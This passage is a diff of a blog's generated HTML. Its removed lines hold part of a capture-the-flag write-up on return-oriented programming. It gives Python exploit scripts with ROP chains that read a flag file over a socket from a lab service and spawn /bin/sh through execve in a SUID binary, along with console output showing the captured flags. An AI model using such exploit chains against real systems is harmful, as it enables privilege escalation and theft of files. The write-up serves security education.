-</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080486d0</span><span class="p">)</span> <span class="c"># open@plt</span>
-</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08049128</span><span class="p">)</span> <span class="c"># The flag string in the data section.</span>
-</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>        <span class="c"># O_RDONLY.</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048640</span><span class="p">)</span> <span class="c"># read@plt</span>
-</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>          <span class="c"># Read from the newly created descriptor.</span>
-</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a304</span><span class="p">)</span>  <span class="c"># Read contents to the dynamic section.</span>
-</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">)</span>        <span class="c"># Size of the dynamic ELF section.</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048700</span><span class="p">)</span> <span class="c"># write@plt</span>
-</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">)</span>          <span class="c"># Write to the original socket file descriptor.</span>
-</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
-</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="s">&quot;BOOM&quot;</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Banner.</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;store&quot;</span><span class="p">)</span>     <span class="c"># The internal application command.</span>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># How many bytes in your file?</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;128&quot;</span><span class="p">)</span>       <span class="c"># Must be bigger than the 32 bytes of the filename.</span>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Please send your file (the contents).</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;boom&quot;</span><span class="p">)</span>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Error treatment and filename.</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>      <span class="c"># The internal application command.</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># To get the contents of the flag file.</span>
-</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>At last, called the above Python code to remotely extract the contents of the
-file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> python boom.py
-</span><span class='line'><span class="go">Welcome to </span>
-</span><span class='line'>
-</span><span class='line'><span class="go"> XERXES File Storage System</span>
-</span><span class='line'><span class="go">  available commands are:</span>
-</span><span class='line'><span class="go">  store, read, exit.</span>
-</span><span class='line'>
-</span><span class='line'><span class="gp">&gt;</span>
-</span><span class='line'><span class="go"> Please, how many bytes is your file?</span>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'><span class="gp">&gt;</span>
-</span><span class='line'><span class="go"> Please, send your file:</span>
-</span><span class='line'>
-</span><span class='line'><span class="gp">&gt;</span>
-</span><span class='line'><span class="go">   XERXES regrets to inform you</span>
-</span><span class='line'><span class="go">    that an error occurred</span>
-</span><span class='line'><span class="go">        while receiving your file.</span>
-</span><span class='line'><span class="go"> Please, give a filename:</span>
-</span><span class='line'><span class="gp">&gt;</span> flag<span class="o">{</span>just_one_rop_chain_a_day_keeps_the_doctor_away<span class="o">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>level2</h2>
-
-<p>The bad characters list should be enumerated by sending them in sequence, firing
-up gdb and checking the stack values. For instance:</p>
-
-<pre><code>gdb-peda$ x/64x $esp
-0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
-                                ^^^^^^^^
-                                no \x09
-</code></pre>
-
-<p>Then, it is a matter of choosing the correct gadgets by taking into account the
-above bad characters. Decided by using the already present strcpy(3) function in
-the binary and copy the /bin/sh character array (character by character) to the
-BSS segment and using a gadget to store a NUL byte by zeroing the eax register
-first and using a mov instruction.</p>
-
-<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
-by moving into eax the execve system call number and into ebx the address of the
-/bin/sh character array (which is in the BSS section).</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
-</span><span class='line'>
-</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
-</span><span class='line'><span class="n">badchars</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x00\x09\x0a\x20</span><span class="s">&quot;</span>   <span class="c"># List of bad characters.</span>
-</span><span class='line'><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080cab40</span>                <span class="c"># The address of the BSS section.</span>
-</span><span class='line'><span class="n">execvenb</span> <span class="o">=</span> <span class="mi">11</span>                   <span class="c"># System call execve number.</span>
-</span><span class='line'>
-</span><span class='line'><span class="c"># Functions.</span>
-</span><span class='line'><span class="n">bssaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>
-</span><span class='line'><span class="n">strcpyaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08051160</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="c"># Gadgets.</span>
-</span><span class='line'><span class="n">boom</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span>     <span class="c"># dummy</span>
-</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048893</span><span class="p">)</span>
-</span><span class='line'><span class="n">syscall</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052ba0</span><span class="p">)</span>
-</span><span class='line'><span class="n">xoreax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0808d2cd</span><span class="p">)</span>   <span class="c"># xor eax,eax|pop ebp|ret</span>
-</span><span class='line'><span class="n">inceax</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08083d82</span><span class="p">)</span>   <span class="c"># inc eax|ret</span>
-</span><span class='line'><span class="n">movedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08078e71</span><span class="p">)</span>   <span class="c"># mov dword ptr [edx],eax|ret</span>
-</span><span class='line'><span class="n">popedx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08052476</span><span class="p">)</span>
-</span><span class='line'><span class="n">popebx</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0805249e</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="c"># Characters.</span>
-</span><span class='line'><span class="n">slashaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048483</span><span class="p">)</span>
-</span><span class='line'><span class="n">baddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804b262</span><span class="p">)</span>
-</span><span class='line'><span class="n">iaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a0ca</span><span class="p">)</span>
-</span><span class='line'><span class="n">naddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048b65</span><span class="p">)</span>
-</span><span class='line'><span class="n">saddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048110</span><span class="p">)</span>
-</span><span class='line'><span class="n">haddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048113</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">baddr</span>      <span class="c"># b</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">iaddr</span>      <span class="c"># i</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">naddr</span>      <span class="c"># n</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">slashaddr</span>  <span class="c"># /</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">saddr</span>      <span class="c"># s</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">strcpyaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">haddr</span>      <span class="c"># h</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popedx</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">bss</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="c"># Put the address of BSS + 7.</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">movedx</span>                       <span class="c"># Store a NUL after the string.</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">xoreax</span> <span class="o">+</span> <span class="n">boom</span>                <span class="c"># The xor gadget also pops.</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">inceax</span> <span class="o">*</span> <span class="n">execvenb</span>            <span class="c"># eax = 11.</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">popebx</span> <span class="o">+</span> <span class="n">bssaddr</span>             <span class="c"># ebx = &quot;/bin/sh\0&quot;</span>
-</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">syscall</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In conclusion, the execution of the SUID binary with the payload as an argument
-to capture the flag:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level2@rop:~$</span> ./level2 <span class="sb">`</span>python boom.py<span class="sb">`</span>
-</span><span class='line'><span class="go">[+] ROP tutorial level2</span>
-</span><span class='line'><span class="go">[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#@#</span>
-</span><span class='line'><span class="go">                                                                                              ##A#</span>
-</span><span class='line'><span class="go">                                                                                                b#B#</span>
-</span><span class='line'><span class="go">                                                                                                   #C#</span>
-</span><span class='line'><span class="go">                                                                                                     e#D#</span>
-</span><span class='line'><span class="go">                                                                                                        ##E#</span>
-</span><span class='line'><span class="go">                                                                                                           #F#</span>
-</span><span class='line'><span class="go">                                                                                                           DCBAvG#</span>
-</span><span class='line'><span class="go">                                                                                                                DCBA#@#</span>
-</span><span class='line'><span class="go">                                                                                                                      #!</span>
-</span><span class='line'><span class="gp">#</span> cat flag
-</span><span class='line'><span class="go">flag{to_rop_or_not_to_rop}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
+    
+      <a class="prev" href="/posts/2">&larr; Older</a>
     
     <a href="/blog/archives">Blog Archives</a>
     
@@ -6882,6 +6810,10 @@ to capture the flag:</p>
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/21/slae-0x07-crypter/">SLAE 0x07: Crypter</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/">SLAE 0x06: Polymorphic Shellcodes</a>
@@ -6897,10 +6829,6 @@ to capture the flag:</p>
     
       <li class="post">
         <a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
       </li>
     
   </ul>
